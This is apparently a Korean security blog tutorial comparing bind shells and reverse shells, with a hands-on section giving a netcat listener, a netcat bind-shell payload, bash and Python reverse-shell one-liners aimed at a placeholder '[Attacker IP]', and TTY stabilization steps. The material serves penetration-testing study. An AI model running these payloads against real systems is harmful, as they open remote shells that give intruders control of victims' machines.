---
layout: post
title: "Reverse Shell vs Bind Shell"
date: 2025-09-05 17:00:00 +0900
categories: [system-hacking]
---

## 1. 개요

**Shell (쉘)** 획득은 시스템 해킹의 최종 목표 중 하나로, 공격자가 대상 시스템에 명령을 내릴 수 있는 인터페이스를 확보하는 것을 의미한다.
쉘 연결 방식은 크게 **리버스 쉘(Reverse Shell)**과 **바인드 쉘(Bind Shell)**로 나뉘며, 네트워크 환경과 방화벽 설정에 따라 적절한 방식을 선택해야 공격 성공률을 높일 수 있다.
본 글에서는 두 방식의 동작 원리와 장단점을 비교하고, 가장 널리 쓰이는 리버스 쉘을 안정적으로 연결(Stabilization)하는 실습을 다룬다.

---

## 2. Bind Shell 원리

*   **동작 방식**: 공격 대상(Victim)이 서버가 되어 포트를 열고, 공격자(Attacker)가 클라이언트가 되어 접속하는 방식이다.
*   **흐름**: `Attacker` -> `Connect` -> `Victim (Listening)`
*   **페이로드 예시 (Target)**:
    ```bash
    nc -lvnp 4444 -e /bin/bash
    ```
*   **한계**: 대부분의 방화벽은 외부에서 내부로 들어오는 연결(Inbound)을 엄격하게 차단하므로, 실제 해킹 환경에서는 성공하기 어렵다.

---

## 3. Reverse Shell 원리

*   **동작 방식**: 공격자(Attacker)가 서버가 되어 포트를 열고, 공격 대상(Victim)이 클라이언트가 되어 공격자에게 접속하는 방식이다.
*   **흐름**: `Victim` -> `Connect` -> `Attacker (Listening)`
*   **장점**: 대부분의 방화벽은 내부에서 외부로 나가는 연결(Outbound)을 허용하는 경우가 많기 때문에, 바인드 쉘보다 성공 확률이 훨씬 높다.

---

## 4. 공격 실습: Reverse Shell

리버스 쉘 연결은 크게 3단계로 진행된다.

### 1단계: 공격자 리스너 설정
가장 먼저 대상 서버로부터의 연결을 받을 준비를 해야 한다. `netcat`을 이용해 특정 포트를 열고 연결을 기다린다.

```bash
# 4444번 포트에서 연결 대기 (Verbose, No-DNS, Port 지정)
nc -lvnp 4444
```

### 2단계: 대상 서버에서 페이로드 실행
대상 서버의 환경에 맞는 코드를 실행하여 공격자에게 연결을 시도한다. `revshells.com` 등을 참고하여 다양한 언어의 페이로드를 사용할 수 있다.

*   **Bash**:
    ```bash
    bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1
    ```
*   **Python**:
    ```bash
    python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[Attacker IP]",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
    ```

![Reverseshell](/assets/images/system-hacking/Reverse_1.png)

---

## 5. Shell Stabilization (쉘 안정화)

처음 획득한 쉘은 `Tab` 자동 완성이나 `Ctrl+C`, 화살표 키가 동작하지 않는 불안정한 상태(Dumb Shell)이다. 이를 대화형 TTY 쉘로 업그레이드해야 원활한 작업이 가능하다.

### 1. TTY 쉘 생성
Python 등을 이용해 가상 터미널을 생성한다.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 2. 터미널 제어권 확보
현재 쉘을 백그라운드로 보내고(`Ctrl+Z`), 로컬 터미널 설정을 조정한 뒤 다시 가져온다.
```bash
# (Ctrl+Z) 입력하여 백그라운드 전환
stty raw -echo; fg
# (Enter) 두 번 입력
```

### 3. 환경 변수 설정
터미널 크기와 종류를 설정하여 `clear`, `vi` 등이 깨지지 않도록 한다.
```bash
export TERM=xterm
```

<hr class="short-rule">